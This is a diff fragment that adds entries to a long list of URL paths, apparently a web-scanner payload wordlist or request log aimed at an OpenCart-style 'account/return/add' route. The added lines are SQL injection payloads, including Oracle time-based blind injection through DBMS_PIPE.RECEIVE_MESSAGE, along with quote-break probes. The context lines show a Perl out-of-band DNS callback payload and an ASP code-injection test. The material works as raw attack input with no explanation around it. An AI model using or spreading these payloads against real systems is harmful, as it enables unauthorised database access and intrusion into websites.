@@ -52773,3 +52773,9 @@ http://ifconfig.me/
 /\x22.gethostbyname(lc(\x22hitha\x22.\x22zzkhfjpr8583e.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(101).chr(72).chr(98).chr(82).\x22?route=account/return/add
 /response.write(9978890*9741193)
 /!(()&&!|*|*|?route=account/return/add
+/index.php'\x22?route=account/return/add
+/new_contact'\x22
+/@@Ehihv
+/index.php'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'?route=account/return/add
+/new_contact'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
+/@@7flGf?route=account/return/add
